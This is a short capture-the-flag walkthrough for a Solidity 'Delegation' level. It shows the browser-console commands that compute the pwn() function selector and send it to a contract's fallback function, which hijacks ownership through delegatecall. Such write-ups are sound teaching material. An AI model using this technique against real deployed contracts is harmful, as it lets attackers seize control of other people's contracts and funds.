# Delegation

The goal of this level is for you to claim ownership of the instance you are given.

## Solution

This task will be performed in the browser console.

1. A delegate call is a special low-level call in Solidity to make external calls to another contract. Thus, as the data to trigger the fallback function, we can pass the low-level representation of the command `pnw()`, which similarly to the previous `Delegate` contract, will change the owner of the `Delegation` contract.

2. Let's obtain the function signature of pwn() function by calling:

    ```bash
    web3.utils.sha3("pwn()")
    ```

    Let's save the first 4 bytes (0x and 8 digits after) of the obtained result.

3. Initiate a transaction, passing the sender's address, the recipient's address, and the function signature:

    ```bash
    sendTransaction({from: player, to: instance, data: '0xdd365b8b'})
    ```

To verify the correctness of the execution, you can call `await contract.owner()`, which should correspond to the wallet address.
